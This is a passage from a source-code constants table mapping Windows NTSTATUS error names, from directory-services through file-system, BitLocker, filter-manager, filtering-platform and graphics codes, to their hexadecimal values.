STATUS_DS_FLAT_NAME_EXISTS_IN_FOREST                                      NTStatus      = 0xC000041B
STATUS_DS_GC_NOT_AVAILABLE                                                NTStatus      = 0xC00002B0
STATUS_DS_GC_REQUIRED                                                     NTStatus      = 0xC00002E4
STATUS_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER                             NTStatus      = 0xC00002DA
STATUS_DS_GLOBAL_CANT_HAVE_LOCAL_MEMBER                                   NTStatus      = 0xC00002D7
STATUS_DS_GLOBAL_CANT_HAVE_UNIVERSAL_MEMBER                               NTStatus      = 0xC00002D8
STATUS_DS_GROUP_CONVERSION_ERROR                                          NTStatus      = 0xC0000406
STATUS_DS_HAVE_PRIMARY_MEMBERS                                            NTStatus      = 0xC00002DC
STATUS_DS_INCORRECT_ROLE_OWNER                                            NTStatus      = 0xC00002A9
STATUS_DS_INIT_FAILURE                                                    NTStatus      = 0xC00002E2
STATUS_DS_INIT_FAILURE_CONSOLE                                            NTStatus      = 0xC00002EC
STATUS_DS_INVALID_ATTRIBUTE_SYNTAX                                        NTStatus      = 0xC00002A2
STATUS_DS_INVALID_GROUP_TYPE                                              NTStatus      = 0xC00002D4
STATUS_DS_LOCAL_CANT_HAVE_CROSSDOMAIN_LOCAL_MEMBER                        NTStatus      = 0xC00002DB
STATUS_DS_LOCAL_MEMBER_OF_LOCAL_ONLY                                      NTStatus      = 0xC00002E5
STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED                                  NTStatus      = 0xC00002E7
STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY                                    NTStatus      = 0x00000121
STATUS_DS_NAME_NOT_UNIQUE                                                 NTStatus      = 0xC0000404
STATUS_DS_NO_ATTRIBUTE_OR_VALUE                                           NTStatus      = 0xC00002A1
STATUS_DS_NO_FPO_IN_UNIVERSAL_GROUPS                                      NTStatus      = 0xC00002E6
STATUS_DS_NO_MORE_RIDS                                                    NTStatus      = 0xC00002A8
STATUS_DS_NO_NEST_GLOBALGROUP_IN_MIXEDDOMAIN                              NTStatus      = 0xC00002D5
STATUS_DS_NO_NEST_LOCALGROUP_IN_MIXEDDOMAIN                               NTStatus      = 0xC00002D6
STATUS_DS_NO_RIDS_ALLOCATED                                               NTStatus      = 0xC00002A7
STATUS_DS_OBJ_CLASS_VIOLATION                                             NTStatus      = 0xC00002AB
STATUS_DS_OID_MAPPED_GROUP_CANT_HAVE_MEMBERS                              NTStatus      = 0xC000A087
STATUS_DS_OID_NOT_FOUND                                                   NTStatus      = 0xC000A088
STATUS_DS_RIDMGR_DISABLED                                                 NTStatus      = 0xC00002BA
STATUS_DS_RIDMGR_INIT_ERROR                                               NTStatus      = 0xC00002AA
STATUS_DS_SAM_INIT_FAILURE                                                NTStatus      = 0xC00002CB
STATUS_DS_SAM_INIT_FAILURE_CONSOLE                                        NTStatus      = 0xC00002ED
STATUS_DS_SENSITIVE_GROUP_VIOLATION                                       NTStatus      = 0xC00002CD
STATUS_DS_SHUTTING_DOWN                                                   NTStatus      = 0x40000370
STATUS_DS_SRC_SID_EXISTS_IN_FOREST                                        NTStatus      = 0xC0000419
STATUS_DS_UNAVAILABLE                                                     NTStatus      = 0xC00002A6
STATUS_DS_UNIVERSAL_CANT_HAVE_LOCAL_MEMBER                                NTStatus      = 0xC00002D9
STATUS_DS_VERSION_CHECK_FAILURE                                           NTStatus      = 0xC0000355
STATUS_DUPLICATE_NAME                                                     NTStatus      = 0xC00000BD
STATUS_DUPLICATE_OBJECTID                                                 NTStatus      = 0xC000022A
STATUS_DUPLICATE_PRIVILEGES                                               NTStatus      = 0xC00001A6
STATUS_DYNAMIC_CODE_BLOCKED                                               NTStatus      = 0xC0000604
STATUS_EAS_NOT_SUPPORTED                                                  NTStatus      = 0xC000004F
STATUS_EA_CORRUPT_ERROR                                                   NTStatus      = 0xC0000053
STATUS_EA_LIST_INCONSISTENT                                               NTStatus      = 0x80000014
STATUS_EA_TOO_LARGE                                                       NTStatus      = 0xC0000050
STATUS_EFS_ALG_BLOB_TOO_BIG                                               NTStatus      = 0xC0000352
STATUS_EFS_NOT_ALLOWED_IN_TRANSACTION                                     NTStatus      = 0xC019003E
STATUS_ELEVATION_REQUIRED                                                 NTStatus      = 0xC000042C
STATUS_ENCLAVE_FAILURE                                                    NTStatus      = 0xC000048F
STATUS_ENCLAVE_IS_TERMINATING                                             NTStatus      = 0xC0000512
STATUS_ENCLAVE_NOT_TERMINATED                                             NTStatus      = 0xC0000511
STATUS_ENCLAVE_VIOLATION                                                  NTStatus      = 0xC00004A2
STATUS_ENCOUNTERED_WRITE_IN_PROGRESS                                      NTStatus      = 0xC0000433
STATUS_ENCRYPTED_IO_NOT_POSSIBLE                                          NTStatus      = 0xC0000810
STATUS_ENCRYPTING_METADATA_DISALLOWED                                     NTStatus      = 0xC00004B7
STATUS_ENCRYPTION_DISABLED                                                NTStatus      = 0xC00004B6
STATUS_ENCRYPTION_FAILED                                                  NTStatus      = 0xC000028A
STATUS_END_OF_FILE                                                        NTStatus      = 0xC0000011
STATUS_END_OF_MEDIA                                                       NTStatus      = 0x8000001E
STATUS_ENLISTMENT_NOT_FOUND                                               NTStatus      = 0xC0190050
STATUS_ENLISTMENT_NOT_SUPERIOR                                            NTStatus      = 0xC0190033
STATUS_ENTRYPOINT_NOT_FOUND                                               NTStatus      = 0xC0000139
STATUS_EOF_ON_GHOSTED_RANGE                                               NTStatus      = 0xC000A007
STATUS_EOM_OVERFLOW                                                       NTStatus      = 0xC0000177
STATUS_ERROR_PROCESS_NOT_IN_JOB                                           NTStatus      = 0xC00001AE
STATUS_EVALUATION_EXPIRATION                                              NTStatus      = 0xC0000268
STATUS_EVENTLOG_CANT_START                                                NTStatus      = 0xC000018F
STATUS_EVENTLOG_FILE_CHANGED                                              NTStatus      = 0xC0000197
STATUS_EVENTLOG_FILE_CORRUPT                                              NTStatus      = 0xC000018E
STATUS_EVENT_DONE                                                         NTStatus      = 0x40000012
STATUS_EVENT_PENDING                                                      NTStatus      = 0x40000013
STATUS_EXECUTABLE_MEMORY_WRITE                                            NTStatus      = 0xC0000723
STATUS_EXPIRED_HANDLE                                                     NTStatus      = 0xC0190060
STATUS_EXTERNAL_BACKING_PROVIDER_UNKNOWN                                  NTStatus      = 0xC000046E
STATUS_EXTERNAL_SYSKEY_NOT_SUPPORTED                                      NTStatus      = 0xC00004A1
STATUS_EXTRANEOUS_INFORMATION                                             NTStatus      = 0x80000017
STATUS_FAILED_DRIVER_ENTRY                                                NTStatus      = 0xC0000365
STATUS_FAILED_STACK_SWITCH                                                NTStatus      = 0xC0000373
STATUS_FAIL_CHECK                                                         NTStatus      = 0xC0000229
STATUS_FAIL_FAST_EXCEPTION                                                NTStatus      = 0xC0000602
STATUS_FASTPATH_REJECTED                                                  NTStatus      = 0xC000A014
STATUS_FATAL_APP_EXIT                                                     NTStatus      = 0x40000015
STATUS_FATAL_MEMORY_EXHAUSTION                                            NTStatus      = 0xC00001AD
STATUS_FATAL_USER_CALLBACK_EXCEPTION                                      NTStatus      = 0xC000041D
STATUS_FILEMARK_DETECTED                                                  NTStatus      = 0x8000001B
STATUS_FILES_OPEN                                                         NTStatus      = 0xC0000107
STATUS_FILE_CHECKED_OUT                                                   NTStatus      = 0xC0000901
STATUS_FILE_CLOSED                                                        NTStatus      = 0xC0000128
STATUS_FILE_CORRUPT_ERROR                                                 NTStatus      = 0xC0000102
STATUS_FILE_DELETED                                                       NTStatus      = 0xC0000123
STATUS_FILE_ENCRYPTED                                                     NTStatus      = 0xC0000293
STATUS_FILE_FORCED_CLOSED                                                 NTStatus      = 0xC00000B6
STATUS_FILE_HANDLE_REVOKED                                                NTStatus      = 0xC0000910
STATUS_FILE_IDENTITY_NOT_PERSISTENT                                       NTStatus      = 0xC0190036
STATUS_FILE_INVALID                                                       NTStatus      = 0xC0000098
STATUS_FILE_IS_A_DIRECTORY                                                NTStatus      = 0xC00000BA
STATUS_FILE_IS_OFFLINE                                                    NTStatus      = 0xC0000267
STATUS_FILE_LOCKED_WITH_ONLY_READERS                                      NTStatus      = 0x0000012A
STATUS_FILE_LOCKED_WITH_WRITERS                                           NTStatus      = 0x0000012B
STATUS_FILE_LOCK_CONFLICT                                                 NTStatus      = 0xC0000054
STATUS_FILE_METADATA_OPTIMIZATION_IN_PROGRESS                             NTStatus      = 0xC00001AB
STATUS_FILE_NOT_AVAILABLE                                                 NTStatus      = 0xC0000467
STATUS_FILE_NOT_ENCRYPTED                                                 NTStatus      = 0xC0000291
STATUS_FILE_NOT_SUPPORTED                                                 NTStatus      = 0xC00004B4
STATUS_FILE_PROTECTED_UNDER_DPL                                           NTStatus      = 0xC00004A3
STATUS_FILE_RENAMED                                                       NTStatus      = 0xC00000D5
STATUS_FILE_SYSTEM_LIMITATION                                             NTStatus      = 0xC0000427
STATUS_FILE_SYSTEM_VIRTUALIZATION_BUSY                                    NTStatus      = 0xC000CE03
STATUS_FILE_SYSTEM_VIRTUALIZATION_INVALID_OPERATION                       NTStatus      = 0xC000CE05
STATUS_FILE_SYSTEM_VIRTUALIZATION_METADATA_CORRUPT                        NTStatus      = 0xC000CE02
STATUS_FILE_SYSTEM_VIRTUALIZATION_PROVIDER_UNKNOWN                        NTStatus      = 0xC000CE04
STATUS_FILE_SYSTEM_VIRTUALIZATION_UNAVAILABLE                             NTStatus      = 0xC000CE01
STATUS_FILE_TOO_LARGE                                                     NTStatus      = 0xC0000904
STATUS_FIRMWARE_IMAGE_INVALID                                             NTStatus      = 0xC0000485
STATUS_FIRMWARE_SLOT_INVALID                                              NTStatus      = 0xC0000484
STATUS_FIRMWARE_UPDATED                                                   NTStatus      = 0x4000002C
STATUS_FLOATED_SECTION                                                    NTStatus      = 0xC019004B
STATUS_FLOAT_DENORMAL_OPERAND                                             NTStatus      = 0xC000008D
STATUS_FLOAT_DIVIDE_BY_ZERO                                               NTStatus      = 0xC000008E
STATUS_FLOAT_INEXACT_RESULT                                               NTStatus      = 0xC000008F
STATUS_FLOAT_INVALID_OPERATION                                            NTStatus      = 0xC0000090
STATUS_FLOAT_MULTIPLE_FAULTS                                              NTStatus      = 0xC00002B4
STATUS_FLOAT_MULTIPLE_TRAPS                                               NTStatus      = 0xC00002B5
STATUS_FLOAT_OVERFLOW                                                     NTStatus      = 0xC0000091
STATUS_FLOAT_STACK_CHECK                                                  NTStatus      = 0xC0000092
STATUS_FLOAT_UNDERFLOW                                                    NTStatus      = 0xC0000093
STATUS_FLOPPY_BAD_REGISTERS                                               NTStatus      = 0xC0000168
STATUS_FLOPPY_ID_MARK_NOT_FOUND                                           NTStatus      = 0xC0000165
STATUS_FLOPPY_UNKNOWN_ERROR                                               NTStatus      = 0xC0000167
STATUS_FLOPPY_VOLUME                                                      NTStatus      = 0xC0000164
STATUS_FLOPPY_WRONG_CYLINDER                                              NTStatus      = 0xC0000166
STATUS_FLT_ALREADY_ENLISTED                                               NTStatus      = 0xC01C001B
STATUS_FLT_BUFFER_TOO_SMALL                                               NTStatus      = 0x801C0001
STATUS_FLT_CBDQ_DISABLED                                                  NTStatus      = 0xC01C000E
STATUS_FLT_CONTEXT_ALLOCATION_NOT_FOUND                                   NTStatus      = 0xC01C0016
STATUS_FLT_CONTEXT_ALREADY_DEFINED                                        NTStatus      = 0xC01C0002
STATUS_FLT_CONTEXT_ALREADY_LINKED                                         NTStatus      = 0xC01C001C
STATUS_FLT_DELETING_OBJECT                                                NTStatus      = 0xC01C000B
STATUS_FLT_DISALLOW_FAST_IO                                               NTStatus      = 0xC01C0004
STATUS_FLT_DO_NOT_ATTACH                                                  NTStatus      = 0xC01C000F
STATUS_FLT_DO_NOT_DETACH                                                  NTStatus      = 0xC01C0010
STATUS_FLT_DUPLICATE_ENTRY                                                NTStatus      = 0xC01C000D
STATUS_FLT_FILTER_NOT_FOUND                                               NTStatus      = 0xC01C0013
STATUS_FLT_FILTER_NOT_READY                                               NTStatus      = 0xC01C0008
STATUS_FLT_INSTANCE_ALTITUDE_COLLISION                                    NTStatus      = 0xC01C0011
STATUS_FLT_INSTANCE_NAME_COLLISION                                        NTStatus      = 0xC01C0012
STATUS_FLT_INSTANCE_NOT_FOUND                                             NTStatus      = 0xC01C0015
STATUS_FLT_INTERNAL_ERROR                                                 NTStatus      = 0xC01C000A
STATUS_FLT_INVALID_ASYNCHRONOUS_REQUEST                                   NTStatus      = 0xC01C0003
STATUS_FLT_INVALID_CONTEXT_REGISTRATION                                   NTStatus      = 0xC01C0017
STATUS_FLT_INVALID_NAME_REQUEST                                           NTStatus      = 0xC01C0005
STATUS_FLT_IO_COMPLETE                                                    NTStatus      = 0x001C0001
STATUS_FLT_MUST_BE_NONPAGED_POOL                                          NTStatus      = 0xC01C000C
STATUS_FLT_NAME_CACHE_MISS                                                NTStatus      = 0xC01C0018
STATUS_FLT_NOT_INITIALIZED                                                NTStatus      = 0xC01C0007
STATUS_FLT_NOT_SAFE_TO_POST_OPERATION                                     NTStatus      = 0xC01C0006
STATUS_FLT_NO_DEVICE_OBJECT                                               NTStatus      = 0xC01C0019
STATUS_FLT_NO_HANDLER_DEFINED                                             NTStatus      = 0xC01C0001
STATUS_FLT_NO_WAITER_FOR_REPLY                                            NTStatus      = 0xC01C0020
STATUS_FLT_POST_OPERATION_CLEANUP                                         NTStatus      = 0xC01C0009
STATUS_FLT_REGISTRATION_BUSY                                              NTStatus      = 0xC01C0023
STATUS_FLT_VOLUME_ALREADY_MOUNTED                                         NTStatus      = 0xC01C001A
STATUS_FLT_VOLUME_NOT_FOUND                                               NTStatus      = 0xC01C0014
STATUS_FORMS_AUTH_REQUIRED                                                NTStatus      = 0xC0000905
STATUS_FOUND_OUT_OF_SCOPE                                                 NTStatus      = 0xC000022E
STATUS_FREE_SPACE_TOO_FRAGMENTED                                          NTStatus      = 0xC000049B
STATUS_FREE_VM_NOT_AT_BASE                                                NTStatus      = 0xC000009F
STATUS_FSFILTER_OP_COMPLETED_SUCCESSFULLY                                 NTStatus      = 0x00000126
STATUS_FS_DRIVER_REQUIRED                                                 NTStatus      = 0xC000019C
STATUS_FT_DI_SCAN_REQUIRED                                                NTStatus      = 0xC000046C
STATUS_FT_MISSING_MEMBER                                                  NTStatus      = 0xC000015F
STATUS_FT_ORPHANING                                                       NTStatus      = 0xC000016D
STATUS_FT_READ_FAILURE                                                    NTStatus      = 0xC00004AB
STATUS_FT_READ_FROM_COPY                                                  NTStatus      = 0x40000035
STATUS_FT_READ_RECOVERY_FROM_BACKUP                                       NTStatus      = 0x4000000A
STATUS_FT_WRITE_FAILURE                                                   NTStatus      = 0xC000046B
STATUS_FT_WRITE_RECOVERY                                                  NTStatus      = 0x4000000B
STATUS_FULLSCREEN_MODE                                                    NTStatus      = 0xC0000159
STATUS_FVE_ACTION_NOT_ALLOWED                                             NTStatus      = 0xC0210009
STATUS_FVE_AUTH_INVALID_APPLICATION                                       NTStatus      = 0xC021001B
STATUS_FVE_AUTH_INVALID_CONFIG                                            NTStatus      = 0xC021001C
STATUS_FVE_BAD_DATA                                                       NTStatus      = 0xC021000A
STATUS_FVE_BAD_INFORMATION                                                NTStatus      = 0xC0210002
STATUS_FVE_BAD_METADATA_POINTER                                           NTStatus      = 0xC021001F
STATUS_FVE_BAD_PARTITION_SIZE                                             NTStatus      = 0xC0210005
STATUS_FVE_CONV_READ_ERROR                                                NTStatus      = 0xC021000D
STATUS_FVE_CONV_RECOVERY_FAILED                                           NTStatus      = 0xC0210028
STATUS_FVE_CONV_WRITE_ERROR                                               NTStatus      = 0xC021000E
STATUS_FVE_DEBUGGER_ENABLED                                               NTStatus      = 0xC021001D
STATUS_FVE_DEVICE_LOCKEDOUT                                               NTStatus      = 0xC021003B
STATUS_FVE_DRY_RUN_FAILED                                                 NTStatus      = 0xC021001E
STATUS_FVE_EDRIVE_DRY_RUN_FAILED                                          NTStatus      = 0xC0210038
STATUS_FVE_ENH_PIN_INVALID                                                NTStatus      = 0xC0210031
STATUS_FVE_FAILED_AUTHENTICATION                                          NTStatus      = 0xC0210011
STATUS_FVE_FAILED_SECTOR_SIZE                                             NTStatus      = 0xC0210010
STATUS_FVE_FAILED_WRONG_FS                                                NTStatus      = 0xC0210004
STATUS_FVE_FS_MOUNTED                                                     NTStatus      = 0xC0210007
STATUS_FVE_FS_NOT_EXTENDED                                                NTStatus      = 0xC0210006
STATUS_FVE_FULL_ENCRYPTION_NOT_ALLOWED_ON_TP_STORAGE                      NTStatus      = 0xC0210032
STATUS_FVE_INVALID_DATUM_TYPE                                             NTStatus      = 0xC021002A
STATUS_FVE_KEYFILE_INVALID                                                NTStatus      = 0xC0210014
STATUS_FVE_KEYFILE_NOT_FOUND                                              NTStatus      = 0xC0210013
STATUS_FVE_KEYFILE_NO_VMK                                                 NTStatus      = 0xC0210015
STATUS_FVE_LOCKED_VOLUME                                                  NTStatus      = 0xC0210000
STATUS_FVE_MOR_FAILED                                                     NTStatus      = 0xC0210025
STATUS_FVE_NOT_ALLOWED_ON_CLUSTER                                         NTStatus      = 0xC0210035
STATUS_FVE_NOT_ALLOWED_ON_CSV_STACK                                       NTStatus      = 0xC0210034
STATUS_FVE_NOT_ALLOWED_TO_UPGRADE_WHILE_CONVERTING                        NTStatus      = 0xC0210036
STATUS_FVE_NOT_DATA_VOLUME                                                NTStatus      = 0xC021000C
STATUS_FVE_NOT_DE_VOLUME                                                  NTStatus      = 0xC021003D
STATUS_FVE_NOT_ENCRYPTED                                                  NTStatus      = 0xC0210001
STATUS_FVE_NOT_OS_VOLUME                                                  NTStatus      = 0xC0210012
STATUS_FVE_NO_AUTOUNLOCK_MASTER_KEY                                       NTStatus      = 0xC0210024
STATUS_FVE_NO_FEATURE_LICENSE                                             NTStatus      = 0xC0210026
STATUS_FVE_NO_LICENSE                                                     NTStatus      = 0xC0210008
STATUS_FVE_OLD_METADATA_COPY                                              NTStatus      = 0xC0210020
STATUS_FVE_OSV_KSR_NOT_ALLOWED                                            NTStatus      = 0xC0210040
STATUS_FVE_OVERLAPPED_UPDATE                                              NTStatus      = 0xC021000F
STATUS_FVE_PARTIAL_METADATA                                               NTStatus      = 0x80210001
STATUS_FVE_PIN_INVALID                                                    NTStatus      = 0xC021001A
STATUS_FVE_POLICY_USER_DISABLE_RDV_NOT_ALLOWED                            NTStatus      = 0xC0210027
STATUS_FVE_PROTECTION_CANNOT_BE_DISABLED                                  NTStatus      = 0xC021003F
STATUS_FVE_PROTECTION_DISABLED                                            NTStatus      = 0xC021003E
STATUS_FVE_RAW_ACCESS                                                     NTStatus      = 0xC0210022
STATUS_FVE_RAW_BLOCKED                                                    NTStatus      = 0xC0210023
STATUS_FVE_REBOOT_REQUIRED                                                NTStatus      = 0xC0210021
STATUS_FVE_SECUREBOOT_CONFIG_CHANGE                                       NTStatus      = 0xC021003A
STATUS_FVE_SECUREBOOT_DISABLED                                            NTStatus      = 0xC0210039
STATUS_FVE_TOO_SMALL                                                      NTStatus      = 0xC0210003
STATUS_FVE_TPM_DISABLED                                                   NTStatus      = 0xC0210016
STATUS_FVE_TPM_INVALID_PCR                                                NTStatus      = 0xC0210018
STATUS_FVE_TPM_NO_VMK                                                     NTStatus      = 0xC0210019
STATUS_FVE_TPM_SRK_AUTH_NOT_ZERO                                          NTStatus      = 0xC0210017
STATUS_FVE_TRANSIENT_STATE                                                NTStatus      = 0x80210002
STATUS_FVE_VIRTUALIZED_SPACE_TOO_BIG                                      NTStatus      = 0xC0210029
STATUS_FVE_VOLUME_EXTEND_PREVENTS_EOW_DECRYPT                             NTStatus      = 0xC021003C
STATUS_FVE_VOLUME_NOT_BOUND                                               NTStatus      = 0xC021000B
STATUS_FVE_VOLUME_TOO_SMALL                                               NTStatus      = 0xC0210030
STATUS_FVE_WIPE_CANCEL_NOT_APPLICABLE                                     NTStatus      = 0xC0210037
STATUS_FVE_WIPE_NOT_ALLOWED_ON_TP_STORAGE                                 NTStatus      = 0xC0210033
STATUS_FWP_ACTION_INCOMPATIBLE_WITH_LAYER                                 NTStatus      = 0xC022002C
STATUS_FWP_ACTION_INCOMPATIBLE_WITH_SUBLAYER                              NTStatus      = 0xC022002D
STATUS_FWP_ALREADY_EXISTS                                                 NTStatus      = 0xC0220009
STATUS_FWP_BUILTIN_OBJECT                                                 NTStatus      = 0xC0220017
STATUS_FWP_CALLOUT_NOTIFICATION_FAILED                                    NTStatus      = 0xC0220037
STATUS_FWP_CALLOUT_NOT_FOUND                                              NTStatus      = 0xC0220001
STATUS_FWP_CANNOT_PEND                                                    NTStatus      = 0xC0220103
STATUS_FWP_CONDITION_NOT_FOUND                                            NTStatus      = 0xC0220002
STATUS_FWP_CONNECTIONS_DISABLED                                           NTStatus      = 0xC0220041
STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_CALLOUT                              NTStatus      = 0xC022002F
STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_LAYER                                NTStatus      = 0xC022002E
STATUS_FWP_DROP_NOICMP                                                    NTStatus      = 0xC0220104
STATUS_FWP_DUPLICATE_AUTH_METHOD                                          NTStatus      = 0xC022003C
STATUS_FWP_DUPLICATE_CONDITION                                            NTStatus      = 0xC022002A
STATUS_FWP_DUPLICATE_KEYMOD                                               NTStatus      = 0xC022002B
STATUS_FWP_DYNAMIC_SESSION_IN_PROGRESS                                    NTStatus      = 0xC022000B
STATUS_FWP_EM_NOT_SUPPORTED                                               NTStatus      = 0xC0220032
STATUS_FWP_FILTER_NOT_FOUND                                               NTStatus      = 0xC0220003
STATUS_FWP_IKEEXT_NOT_RUNNING                                             NTStatus      = 0xC0220044
STATUS_FWP_INCOMPATIBLE_AUTH_METHOD                                       NTStatus      = 0xC0220030
STATUS_FWP_INCOMPATIBLE_CIPHER_TRANSFORM                                  NTStatus      = 0xC022003A
STATUS_FWP_INCOMPATIBLE_DH_GROUP                                          NTStatus      = 0xC0220031
STATUS_FWP_INCOMPATIBLE_LAYER                                             NTStatus      = 0xC0220014
STATUS_FWP_INCOMPATIBLE_SA_STATE                                          NTStatus      = 0xC022001B
STATUS_FWP_INCOMPATIBLE_TXN                                               NTStatus      = 0xC0220011
STATUS_FWP_INJECT_HANDLE_CLOSING                                          NTStatus      = 0xC0220101
STATUS_FWP_INJECT_HANDLE_STALE                                            NTStatus      = 0xC0220102
STATUS_FWP_INVALID_ACTION_TYPE                                            NTStatus      = 0xC0220024
STATUS_FWP_INVALID_AUTH_TRANSFORM                                         NTStatus      = 0xC0220038
STATUS_FWP_INVALID_CIPHER_TRANSFORM                                       NTStatus      = 0xC0220039
STATUS_FWP_INVALID_DNS_NAME                                               NTStatus      = 0xC0220042
STATUS_FWP_INVALID_ENUMERATOR                                             NTStatus      = 0xC022001D
STATUS_FWP_INVALID_FLAGS                                                  NTStatus      = 0xC022001E
STATUS_FWP_INVALID_INTERVAL                                               NTStatus      = 0xC0220021
STATUS_FWP_INVALID_NET_MASK                                               NTStatus      = 0xC022001F
STATUS_FWP_INVALID_PARAMETER                                              NTStatus      = 0xC0220035
STATUS_FWP_INVALID_RANGE                                                  NTStatus      = 0xC0220020
STATUS_FWP_INVALID_TRANSFORM_COMBINATION                                  NTStatus      = 0xC022003B
STATUS_FWP_INVALID_TUNNEL_ENDPOINT                                        NTStatus      = 0xC022003D
STATUS_FWP_INVALID_WEIGHT                                                 NTStatus      = 0xC0220025
STATUS_FWP_IN_USE                                                         NTStatus      = 0xC022000A
STATUS_FWP_KEY_DICTATION_INVALID_KEYING_MATERIAL                          NTStatus      = 0xC0220040
STATUS_FWP_KEY_DICTATOR_ALREADY_REGISTERED                                NTStatus      = 0xC022003F
STATUS_FWP_KM_CLIENTS_ONLY                                                NTStatus      = 0xC0220015
STATUS_FWP_L2_DRIVER_NOT_READY                                            NTStatus      = 0xC022003E
STATUS_FWP_LAYER_NOT_FOUND                                                NTStatus      = 0xC0220004
STATUS_FWP_LIFETIME_MISMATCH                                              NTStatus      = 0xC0220016
STATUS_FWP_MATCH_TYPE_MISMATCH                                            NTStatus      = 0xC0220026
STATUS_FWP_NET_EVENTS_DISABLED                                            NTStatus      = 0xC0220013
STATUS_FWP_NEVER_MATCH                                                    NTStatus      = 0xC0220033
STATUS_FWP_NOTIFICATION_DROPPED                                           NTStatus      = 0xC0220019
STATUS_FWP_NOT_FOUND                                                      NTStatus      = 0xC0220008
STATUS_FWP_NO_TXN_IN_PROGRESS                                             NTStatus      = 0xC022000D
STATUS_FWP_NULL_DISPLAY_NAME                                              NTStatus      = 0xC0220023
STATUS_FWP_NULL_POINTER                                                   NTStatus      = 0xC022001C
STATUS_FWP_OUT_OF_BOUNDS                                                  NTStatus      = 0xC0220028
STATUS_FWP_PROVIDER_CONTEXT_MISMATCH                                      NTStatus      = 0xC0220034
STATUS_FWP_PROVIDER_CONTEXT_NOT_FOUND                                     NTStatus      = 0xC0220006
STATUS_FWP_PROVIDER_NOT_FOUND                                             NTStatus      = 0xC0220005
STATUS_FWP_RESERVED                                                       NTStatus      = 0xC0220029
STATUS_FWP_SESSION_ABORTED                                                NTStatus      = 0xC0220010
STATUS_FWP_STILL_ON                                                       NTStatus      = 0xC0220043
STATUS_FWP_SUBLAYER_NOT_FOUND                                             NTStatus      = 0xC0220007
STATUS_FWP_TCPIP_NOT_READY                                                NTStatus      = 0xC0220100
STATUS_FWP_TIMEOUT                                                        NTStatus      = 0xC0220012
STATUS_FWP_TOO_MANY_CALLOUTS                                              NTStatus      = 0xC0220018
STATUS_FWP_TOO_MANY_SUBLAYERS                                             NTStatus      = 0xC0220036
STATUS_FWP_TRAFFIC_MISMATCH                                               NTStatus      = 0xC022001A
STATUS_FWP_TXN_ABORTED                                                    NTStatus      = 0xC022000F
STATUS_FWP_TXN_IN_PROGRESS                                                NTStatus      = 0xC022000E
STATUS_FWP_TYPE_MISMATCH                                                  NTStatus      = 0xC0220027
STATUS_FWP_WRONG_SESSION                                                  NTStatus      = 0xC022000C
STATUS_FWP_ZERO_LENGTH_ARRAY                                              NTStatus      = 0xC0220022
STATUS_GDI_HANDLE_LEAK                                                    NTStatus      = 0x803F0001
STATUS_GENERIC_COMMAND_FAILED                                             NTStatus      = 0xC0150026
STATUS_GENERIC_NOT_MAPPED                                                 NTStatus      = 0xC00000E6
STATUS_GHOSTED                                                            NTStatus      = 0x0000012F
STATUS_GPIO_CLIENT_INFORMATION_INVALID                                    NTStatus      = 0xC000A122
STATUS_GPIO_INCOMPATIBLE_CONNECT_MODE                                     NTStatus      = 0xC000A126
STATUS_GPIO_INTERRUPT_ALREADY_UNMASKED                                    NTStatus      = 0x8000A127
STATUS_GPIO_INVALID_REGISTRATION_PACKET                                   NTStatus      = 0xC000A124
STATUS_GPIO_OPERATION_DENIED                                              NTStatus      = 0xC000A125
STATUS_GPIO_VERSION_NOT_SUPPORTED                                         NTStatus      = 0xC000A123
STATUS_GRACEFUL_DISCONNECT                                                NTStatus      = 0xC0000237
STATUS_GRAPHICS_ADAPTER_ACCESS_NOT_EXCLUDED                               NTStatus      = 0xC01E043B
STATUS_GRAPHICS_ADAPTER_CHAIN_NOT_READY                                   NTStatus      = 0xC01E0433
STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_SOURCE                     NTStatus      = 0xC01E0328
STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_TARGET                     NTStatus      = 0xC01E0329
STATUS_GRAPHICS_ADAPTER_WAS_RESET                                         NTStatus      = 0xC01E0003
STATUS_GRAPHICS_ALLOCATION_BUSY                                           NTStatus      = 0xC01E0102
STATUS_GRAPHICS_ALLOCATION_CLOSED                                         NTStatus      = 0xC01E0112
STATUS_GRAPHICS_ALLOCATION_CONTENT_LOST                                   NTStatus      = 0xC01E0116
STATUS_GRAPHICS_ALLOCATION_INVALID                                        NTStatus      = 0xC01E0106
STATUS_GRAPHICS_CANCEL_VIDPN_TOPOLOGY_AUGMENTATION                        NTStatus      = 0xC01E035A
STATUS_GRAPHICS_CANNOTCOLORCONVERT                                        NTStatus      = 0xC01E0008
STATUS_GRAPHICS_CANT_ACCESS_ACTIVE_VIDPN                                  NTStatus      = 0xC01E0343
STATUS_GRAPHICS_CANT_EVICT_PINNED_ALLOCATION                              NTStatus      = 0xC01E0109
STATUS_GRAPHICS_CANT_LOCK_MEMORY                                          NTStatus      = 0xC01E0101
STATUS_GRAPHICS_CANT_RENDER_LOCKED_ALLOCATION                             NTStatus      = 0xC01E0111
STATUS_GRAPHICS_CHAINLINKS_NOT_ENUMERATED                                 NTStatus      = 0xC01E0432
STATUS_GRAPHICS_CHAINLINKS_NOT_POWERED_ON                                 NTStatus      = 0xC01E0435
STATUS_GRAPHICS_CHAINLINKS_NOT_STARTED                                    NTStatus      = 0xC01E0434
STATUS_GRAPHICS_CHILD_DESCRIPTOR_NOT_SUPPORTED                            NTStatus      = 0xC01E0401
STATUS_GRAPHICS_CLIENTVIDPN_NOT_SET                                       NTStatus      = 0xC01E035C
STATUS_GRAPHICS_COPP_NOT_SUPPORTED                                        NTStatus      = 0xC01E0501
STATUS_GRAPHICS_DATASET_IS_EMPTY                                          NTStatus      = 0x401E034B
STATUS_GRAPHICS_DDCCI_INVALID_CAPABILITIES_STRING                         NTStatus      = 0xC01E0587
STATUS_GRAPHICS_DDCCI_INVALID_DATA                                        NTStatus      = 0xC01E0585
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_CHECKSUM                            NTStatus      = 0xC01E058B
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_COMMAND                             NTStatus      = 0xC01E0589
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_LENGTH                              NTStatus      = 0xC01E058A
STATUS_GRAPHICS_DDCCI_MONITOR_RETURNED_INVALID_TIMING_STATUS_BYTE         NTStatus      = 0xC01E0586
